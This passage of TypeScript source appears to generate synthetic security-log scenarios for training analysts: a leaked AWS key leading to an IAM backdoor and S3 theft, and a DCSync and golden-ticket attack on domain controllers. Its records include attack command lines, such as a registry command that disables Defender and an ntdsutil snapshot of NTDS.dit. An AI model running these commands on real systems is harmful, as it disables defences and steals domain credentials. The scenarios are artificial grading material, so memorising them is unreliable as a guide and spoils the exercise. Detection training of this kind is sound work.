        "aws.cloudtrail.requestParameters.key": "builds/api/2026-06-08/api-4.18.2.tar.gz",
        "event.outcome": "success",
        "event.action": "PutObject",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": ciEgressIp,
      },
    },

    // ── T+0: the leak is detected — GitHub secret scanning on a public repo ──
    {
      id: "evt_kl_01_github_alert", ts: T(0),
      source: "vcs", vendor: "GitHub Advanced Security", event_type: "threat_intel_match",
      severity: "high", mitre_technique: "T1552.001", mitre_tactic: "Credential Access", is_detection: true,
      user_email: "a.levy@rocketstack.io",
      description: `GitHub secret scanning opened alert #42: AWS access key ${leakedKey} in scripts/deploy.sh line 14 of the public repo rocketstack-io/deploy-scripts, pushed by a.levy@rocketstack.io.`,
      raw: {
        "event.provider": "GitHub Advanced Security",
        "event.action": "secret_scanning_alert_created",
        "github.secret_scanning.alert_number": "42",
        "github.secret_scanning.secret_type": "aws_access_key_id",
        "github.secret_scanning.secret_type_display_name": "Amazon AWS Access Key ID",
        "github.secret_scanning.secret": leakedKey,
        "github.secret_scanning.validity": "active",
        "github.secret_scanning.repository": "rocketstack-io/deploy-scripts",
        "github.secret_scanning.repository_visibility": "public",
        "github.secret_scanning.commit_sha": "76c770915494ad31afa9e44701a8f39a4924a4e3",
        "github.secret_scanning.path": "scripts/deploy.sh",
        "github.secret_scanning.start_line": "14",
        "github.secret_scanning.pushed_by": "a.levy@rocketstack.io",
        "github.secret_scanning.pushed_at": T(-4 * MIN),
        "github.secret_scanning.push_protection_bypassed": "false",
        "github.secret_scanning.state": "open",
        "github.secret_scanning.publicly_leaked": "true",
      },
    },

    // ── T+2: first use of the key from outside — who am I? ──
    {
      id: "evt_kl_02_getcaller", ts: T(2 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      severity: "high", mitre_technique: "T1078.004", mitre_tactic: "Initial Access",
      src_ip: attackerIp,
      description: `GetCallerIdentity was called with access key ${leakedKey} (${iamUser}) from ${attackerIp} (Singapore).`,
      raw: {
        "aws.cloudtrail.eventName": "GetCallerIdentity",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(iamUser, iamArn, leakedKey),
        ...fromAttacker,
        "event.outcome": "success",
        "event.action": "GetCallerIdentity",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+4: storage discovery (representative record of the List* burst) ──
    {
      id: "evt_kl_03_list_buckets", ts: T(4 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      severity: "medium", mitre_technique: "T1619", mitre_tactic: "Discovery",
      src_ip: attackerIp,
      description: `ListBuckets was called with access key ${leakedKey} from ${attackerIp}, followed within a minute by ListUsers and ListAttachedUserPolicies.`,
      raw: {
        "aws.cloudtrail.eventName": "ListBuckets",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(iamUser, iamArn, leakedKey),
        ...fromAttacker,
        "event.outcome": "success",
        "event.action": "ListBuckets",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+10: a new IAM user — persistence independent of the leaked key ──
    {
      id: "evt_kl_04_create_user", ts: T(10 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "account_create",
      severity: "critical", mitre_technique: "T1136.003", mitre_tactic: "Persistence",
      src_ip: attackerIp,
      description: `CreateUser created IAM user ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "CreateUser",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(iamUser, iamArn, leakedKey),
        ...fromAttacker,
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.requestParameters.path": "/",
        "aws.cloudtrail.responseElements.user.userName": backdoorUser,
        "aws.cloudtrail.responseElements.user.userId": "AIDATQ4XW7Z2KF9MRS3QE",
        "aws.cloudtrail.responseElements.user.arn": backdoorArn,
        "aws.cloudtrail.responseElements.user.createDate": T(10 * MIN),
        "event.outcome": "success",
        "event.action": "CreateUser",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+11: a long-term key for the new user (the key the S3 calls use) ──
    {
      id: "evt_kl_05_create_key", ts: T(11 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1098.001", mitre_tactic: "Persistence",
      src_ip: attackerIp,
      description: `CreateAccessKey issued access key ${backdoorKey} for ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "CreateAccessKey",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(iamUser, iamArn, leakedKey),
        ...fromAttacker,
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.responseElements.accessKey.userName": backdoorUser,
        "aws.cloudtrail.responseElements.accessKey.accessKeyId": backdoorKey,
        "aws.cloudtrail.responseElements.accessKey.status": "Active",
        "aws.cloudtrail.responseElements.accessKey.createDate": T(11 * MIN),
        "event.outcome": "success",
        "event.action": "CreateAccessKey",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+13: full admin on the new user ──
    {
      id: "evt_kl_06_attach_admin", ts: T(13 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_role_change",
      severity: "critical", mitre_technique: "T1098.003", mitre_tactic: "Persistence",
      src_ip: attackerIp,
      description: `AttachUserPolicy attached the AWS managed policy AdministratorAccess to ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "AttachUserPolicy",
        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(iamUser, iamArn, leakedKey),
        ...fromAttacker,
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
        "event.outcome": "success",
        "event.action": "AttachUserPolicy",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+16: GuardDuty on the IAM changes made with the CI key from a new IP ──
    {
      id: "evt_kl_07_gd_persistence", ts: T(16 * MIN),
      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
      severity: "high", mitre_technique: "T1098.001", mitre_tactic: "Persistence", is_detection: true,
      src_ip: attackerIp,
      description: `GuardDuty raised Persistence:IAMUser/AnomalousBehavior (severity 8.0) for ${iamUser}, key ${leakedKey}: CreateAccessKey from ${attackerIp}.`,
      raw: {
        "aws.guardduty.type": "Persistence:IAMUser/AnomalousBehavior",
        "aws.guardduty.severity": "8.0",
        "aws.guardduty.title": "User rocketstack-ci-deploy is anomalously invoking APIs commonly used in Persistence tactics.",
        "aws.guardduty.description": "APIs commonly used in Persistence tactics were invoked by user IAMUser : rocketstack-ci-deploy under unusual circumstances. Such activity is not typically seen from this user.",
        "aws.guardduty.resource.accessKeyDetails.accessKeyId": leakedKey,
        "aws.guardduty.resource.accessKeyDetails.userName": iamUser,
        "aws.guardduty.service.action.awsApiCallAction.api": "CreateAccessKey",
        "aws.guardduty.service.eventFirstSeen": T(10 * MIN),
        "aws.guardduty.service.eventLastSeen": T(13 * MIN),
        "aws.guardduty.service.count": 3,
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.userIdentity.userName": iamUser,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.city_name": "Singapore",
      },
    },

    // ── T+18: the new key reads the customer-data bucket (S3 data event, representative) ──
    {
      id: "evt_kl_08_s3_getobject", ts: T(18 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_storage_access",
      severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection",
      src_ip: attackerIp,
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
      description: `GetObject read ${sampleObject} from ${s3Bucket}, signed with access key ${backdoorKey} (${backdoorUser}) from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.eventCategory": "Data",
        "aws.cloudtrail.awsRegion": "us-east-1",
        ...asUser(backdoorUser, backdoorArn, backdoorKey),
        ...fromAttacker,
        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
        "aws.cloudtrail.requestParameters.key": sampleObject,
        "aws.cloudtrail.additionalEventData.bytesTransferredOut": 412_388_190,
        "event.outcome": "success",
        "event.action": "GetObject",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
      },
    },

    // ── T+31: GuardDuty S3 Protection on the read volume ──
    {
      id: "evt_kl_09_gd_s3_exfil", ts: T(31 * MIN),
      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection", is_detection: true,
      src_ip: attackerIp,
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
      description: `GuardDuty raised Exfiltration:S3/AnomalousBehavior (severity 8.0) on ${s3Bucket}: 1,284 GetObject calls by ${backdoorUser}, key ${backdoorKey}, from ${attackerIp}.`,
      raw: {
        "aws.guardduty.type": "Exfiltration:S3/AnomalousBehavior",
        "aws.guardduty.severity": "8.0",
        "aws.guardduty.title": "An IAM entity invoked an S3 API in a suspicious way.",
        "aws.guardduty.description": "An IAM entity invoked an S3 API in a suspicious way. Such activity is not typically seen from this entity.",
        "aws.guardduty.resource.accessKeyDetails.accessKeyId": backdoorKey,
        "aws.guardduty.resource.accessKeyDetails.userName": backdoorUser,
        "aws.guardduty.resource.s3BucketDetails.name": s3Bucket,
        "aws.guardduty.service.action.awsApiCallAction.api": "GetObject",
        "aws.guardduty.service.eventFirstSeen": T(18 * MIN),
        "aws.guardduty.service.eventLastSeen": T(29 * MIN),
        "aws.guardduty.service.count": 1284,
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
        "aws.cloudtrail.userIdentity.userName": backdoorUser,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.city_name": "Singapore",
      },
    },
  ];

  return {
    title: "Leaked AWS Key → IAM Backdoor → S3 Data Theft", events, T, MIN,
    attackerIp, accountId, iamUser, leakedKey, backdoorUser, backdoorKey, s3Bucket, sampleObject,
  };
}

/** Telemetry half of `buildDCSyncScenario`: the events and the story title, no answer key. */
export function dcSyncScenarioEvents() {
  const B = new Date("2026-06-03T22:15:00Z").getTime();   // 01:15 Israeli time (night attack)
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  // Story-specific VPS (185.220.101.47 is the k8s-pod-escape / Tor-exit IP elsewhere).
  const attackerIp   = "176.97.210.93";
  const dc01         = "SRV-NEXACORP-DC01";
  const dc02         = "SRV-NEXACORP-DC02";
  const adminEmail   = "it.admin@nexacorp.com";
  const mimikatzHash = makeSha256("mimikatz_win32_a_2026");
  const ntdsDitHash        = makeSha256("ntdsutil_ntds_snapshot");
  // ntdsutil.exe is a signed Microsoft binary; it cannot share a hash with
  // the 2.7 GB AD database extract it produces.
  const ntdsutilBinaryHash = makeSha256("ntdsutil_exe_system_binary");

  const events: TelemetryEvent[] = [
    // ── EVENT 1 — RDP logon from Netherlands attacker IP ────────────────────
    {
      id: "evt_dc_01_rdp", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc01, user_email: adminEmail, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1021.001",
      description: `The it.admin account logged on to ${dc01} with a RemoteInteractive (RDP) logon from ${attackerIp} in Amsterdam, Netherlands, at 01:15.`,
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097841",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": dc01 + "$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.TargetUserName": "ITAdmin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xC3F4A1",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "UNKNOWN",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51847",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "winlog.event_data.LogonGuid": "{B2C3D4E5-F6A1-B2C3-D4E5-F6A1B2C3D4E5}",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": T(0),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "source.geo.location.lat": 52.3702,
        "source.geo.location.lon": 4.8952,
        "host.name": dc01,
        "logon.type": "10",
        "authentication.protocol": "Negotiate",
        "authentication.status": "success",
      },
    },

    // ── EVENT 2 — Mimikatz detected by Windows Defender ─────────────────────
    {
      id: "evt_dc_02_mimidetect", ts: T(3 * MIN),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.001",
      file: { path: "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe", sha256: mimikatzHash, size: 1245184 },
      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe on ${dc01} and took no action.`,
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "1116",
        "event.action": "av_detection",
        "event.created": T(3 * MIN),
        "windefend.threat.name": "HackTool:Win32/Mimikatz.A",
        "windefend.threat.id": "2147728490",
        "windefend.threat.category": "Hacktool",
        "windefend.threat.severity": "Severe",
        "windefend.action.name": "NotBlocked",
        "windefend.action.id": "9",
        "windefend.detection.source": "Real-Time Protection",
        "windefend.detection.source_id": "3",
        "windefend.detection.type": "Concrete",
        "windefend.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe",
        "windefend.process.name": "wdhelper.exe",
        "windefend.process.pid": "4872",
        "windefend.origin": "Local machine",
        "windefend.origin_id": "1",
        "windefend.signature.version": "1.411.74.0",
        "windefend.engine.version": "1.1.24050.5",
        "file.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe",
        "file.name": "wdhelper.exe",
        "file.hash.sha256": mimikatzHash,
        "file.size": "1245184",
        "file.signed": "false",
        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
        "host.ip": "10.0.1.10",
      },
    },

    // ── EVENT 3 — Windows Defender real-time protection disabled ─────────────
    {
      id: "evt_dc_03_av_disabled", ts: T(5 * MIN),
      source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1562.001",
      description: `reg.exe set DisableRealtimeMonitoring=1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender on ${dc01}.`,
      raw: {
        "event.provider": "Microsoft Defender Antivirus",
        "event.code": "5001",
        "event.action": "real_time_protection_disabled",
        "event.created": T(5 * MIN),
        "windefend.threat.name": "Settings tampered",
        "windefend.threat.category": "PolicyViolation",
        "windefend.action.name": "NotBlocked",
        "windefend.detection.source": "Security Center",
        "windefend.path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        "windefend.process.name": "reg.exe",
        "windefend.process.pid": "5044",
        "registry.path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
        "registry.value": "1",
        "registry.data.type": "REG_DWORD",
        "registry.hive": "HKLM",
        "registry.change_type": "SetValue",
        "winlog.event_id": "5001",
        "winlog.channel": "Microsoft-Windows-Windows Defender/Operational",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Windows Defender",
        "winlog.event_data.Product Name": "Microsoft Defender Antivirus",
        "winlog.event_data.Product Version": "4.18.24050.7",
        "process.name": "reg.exe",
        "process.pid": "5044",
        "process.parent.name": "cmd.exe",
        "process.command_line": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
        "user.name": "NEXACORP\\ITAdmin",
        "host.name": dc01,
      },
    },

    // ── EVENT 4 — DCSync: DS-Replication-Get-Changes (Event 4662) ───────────
    {
      id: "evt_dc_04_dcsync_get", ts: T(8 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin, a user account, exercised DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights against CN=NEXACORP,DC=nexacorp,DC=com.",
      raw: {
        "winlog.event_id": "4662",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097904",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
        "winlog.event_data.ObjectClass": "domainDNS",
        "winlog.event_data.ObjectName": "CN=NEXACORP,DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.AdditionalInfo2": "-",
        "winlog.event_data.HandleId": "0x0",
        "event.code": "4662",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "event.created": T(8 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
      },
    },

    // ── EVENT 5 — DCSync: krbtgt hash extraction (second 4662) ─────────────
    {
      id: "evt_dc_05_dcsync_krbtgt", ts: T(10 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.006",
      description: "it.admin issued a second replication request, this one specifically targeting CN=krbtgt,CN=Users,DC=nexacorp,DC=com.",
      raw: {
        "winlog.event_id": "4662",
        "winlog.channel": "Security",
        "winlog.computer_name": dc01,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097921",
        "winlog.event_data.SubjectUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.SubjectUserName": "ITAdmin",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0xC3F4A1",
        "winlog.event_data.ObjectServer": "DS",
        "winlog.event_data.ObjectType": "%{bf967aba-0de6-11d0-a285-00aa003049e2}",
        "winlog.event_data.ObjectClass": "user",
        "winlog.event_data.ObjectName": "CN=krbtgt,CN=Users,DC=nexacorp,DC=com",
        "winlog.event_data.OperationType": "Object Access",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} {89e95b76-444d-4c62-991a-0facbeda640c}",
        "winlog.event_data.AdditionalInfo": "%%7688",
        "winlog.event_data.HandleId": "0x0",
        "event.code": "4662",
        "event.action": "object-accessed",
        "event.outcome": "success",
        "event.created": T(10 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "host.name": dc01,
        "ds.object.target": "krbtgt",
        "ds.object.sid": "S-1-5-21-2847391045-1923847562-3041928374-502",
      },
    },

    // ── EVENT 6 — the forged TGT is USED: a TGS request with no TGT behind it ─
    //
    // REWRITTEN. This event previously showed the golden ticket as a 4769 that
    // DC01 had ISSUED (Status 0x0, computer_name dc01), carrying
    // `TicketLifetime: 87600` and `PreAuthType: 0`. Three things were wrong, and
    // the third made the scenario teach the opposite of the truth:
    //
    //   1. `TicketLifetime` does not exist on ANY Windows Kerberos event.
    //      Ticket lifetime is visible in `klist` on the client, never in DC
    //      telemetry — and the graded question rested entirely on it.
    //   2. `PreAuthType` is a 4768 field, not a 4769 field.
    //   3. A golden ticket is forged OFFLINE from the krbtgt hash. The KDC never
    //      sees it minted and writes no issuance record at all. The scenario's
    //      own killchain said "forged offline" while its telemetry showed the DC
    //      issuing it.
    //
    // What a golden ticket ACTUALLY leaves behind is this: the attacker skips
    // the AS exchange entirely and presents the forged TGT to get service
    // tickets, so a 4769 appears with NO 4768 anywhere before it for that
    // account. That absence is the detection, and it is the reason golden
    // tickets are hard — there is nothing anomalous in the ticket itself.
    {
      id: "evt_dc_06_golden_kerberos", ts: T(13 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: dc02, user_email: adminEmail,
      severity: "high", mitre_technique: "T1558.001",
      description: `A service ticket for cifs/${dc02} was requested for it.admin from ${attackerIp}, encrypted with RC4 (0x17).`,
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": dc02,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2097938",
        // TargetUserName is the requesting principal; ServiceName is the
        // service account backing the SPN that was asked for.
        "winlog.event_data.TargetUserName": "it.admin@NEXACORP",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": `${dc02.split(".")[0]}$`,
        "winlog.event_data.ServiceSid": "S-1-5-21-2847391045-1923847562-3041928374-1108",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51847",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "event.created": T(13 * MIN),
        "user.name": "it.admin@NEXACORP",
        "host.name": dc02,
        "source.ip": attackerIp,
      },
    },

    // ── EVENT 6b — the hunt that makes the ABSENCE observable ───────────────
    // You cannot see a missing log by staring at the feed, so the analyst has to
    // go and prove the negative. This is the SIEM query result that does it, and
    // it is deliberately a separate event: the student should understand that
    // this fact was *retrieved*, not handed over.
    {
      id: "evt_dc_06b_no_preceding_tgt", ts: T(14 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "threat_intel_match",
      hostname: dc01, user_email: adminEmail,
      severity: "high",
      description: "A hunting query for Kerberos 4768 events for it.admin across all domain controllers over the prior 24 hours returned zero rows.",
      raw: {
        "sentinel.query.name": "Kerberos TGS without preceding TGT",
        "sentinel.query.window_hours": "24",
        "sentinel.query.target_account": "it.admin@NEXACORP",
        "sentinel.query.event_id_searched": "4768",
        "sentinel.query.domain_controllers_covered": "SRV-NEXACORP-DC01, SRV-NEXACORP-DC02",
        "sentinel.query.rows_returned": "0",
        "sentinel.query.last_4768_for_account": "2026-05-28T09:14:22Z",
        "sentinel.domain.kerberos_encryption_policy": "AES256_HMAC_SHA1 (RC4 disabled 2024-03-11)",
      },
    },

    // ── EVENT 7 — Lateral movement to DC02 using Golden Ticket ──────────────
    {
      id: "evt_dc_07_lateral", ts: T(17 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc02, user_email: adminEmail, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1550.003",
      description: `it.admin authenticated to ${dc02} via a network logon (Type 3) directly from ${attackerIp}.`,
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": dc02,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1843201",
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.TargetUserSid": "S-1-5-21-2847391045-1923847562-3041928374-1115",
        "winlog.event_data.TargetUserName": "ITAdmin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xD4E5F6",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "Kerberos",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "52013",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": T(17 * MIN),
        "user.name": "NEXACORP\\ITAdmin",
        "user.domain": "NEXACORP",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "host.name": dc02,
        "logon.type": "3",
        "authentication.protocol": "Kerberos",
      },
    },

    // ── EVENT 8 — ntdsutil NTDS.dit snapshot (CrowdStrike EDR) ─────────────
    {
      id: "evt_dc_08_ntds", ts: T(20 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_copy",
      hostname: dc01, user_email: adminEmail,
      severity: "critical", mitre_technique: "T1003.003",
      file: { path: "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit", sha256: ntdsDitHash, size: 2898534400 },
      process: {
        name: "ntdsutil.exe", pid: 6028, parent_name: "cmd.exe", parent_pid: 5044,
        cmdline: "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        // An interactive RDP session runs at High integrity even for a Domain
        // Admin — SYSTEM would need a service install or token theft, which this
        // chain never shows. ntdsutil only needs SeBackupPrivilege at High.
        user: "NEXACORP\\ITAdmin", integrity: "high",
      },
      description: `CrowdStrike detected ntdsutil.exe on ${dc01} creating a Volume Shadow Copy snapshot of NTDS.dit (2.7GB), written to C:\\Windows\\Temp\\ntds_snapshot_20260603.dit.`,
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:7eb59df825a6ef192107a743be3a9b1d:9876543210",
        "crowdstrike.detection.description": "ntdsutil.exe executed with snapshot arguments to create a copy of the Active Directory database (NTDS.dit). This technique allows offline extraction of all domain credential hashes without directly touching the live NTDS.dit file (which is locked by LSASS).",
        "crowdstrike.detection.scenario": "ntds_dit_snapshot_via_ntdsutil",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "OS Credential Dumping: NTDS",
        "crowdstrike.detection.technique_id": "T1003.003",
        "crowdstrike.detection.pattern_id": "30758",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Gather Credentials",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.sensor.id": "7eb59df825a6ef192107a743be3a9b1d",
        "crowdstrike.customer_id": "a214f4f4fa1ab768a188dd17a1c89e85",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/7eb59df825a6ef192107a743be3a9b1d/9876543210",
        "crowdstrike.CommandLine": "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.FileName": "ntdsutil.exe",
        // The PROCESS image is ntdsutil.exe, a signed Microsoft binary. The .dit
        // it writes keeps ntdsDitHash on the file block.
        "crowdstrike.SHA256": ntdsutilBinaryHash,
        "crowdstrike.UserName": "NEXACORP\\ITAdmin",
        "crowdstrike.privileges": ["SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege"],
        "crowdstrike.integrity_level": "12288",
        "event.code": "1",
        "event.action": "process_created",
        "event.created": T(20 * MIN),
        "process.name": "ntdsutil.exe",
        "process.pid": "6028",
        "process.executable": "C:\\Windows\\System32\\ntdsutil.exe",
        "process.command_line": "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
        "process.hash.sha256": ntdsutilBinaryHash,
        "process.integrity_level": "HIGH_INTEGRITY_LEVEL",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "5044",
        "file.path": "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit",
        "file.name": "ntds_snapshot_20260603.dit",
        "file.size": "2898534400",
        "file.created": T(20 * MIN + 45_000),
        "file.type": "Active Directory database snapshot",
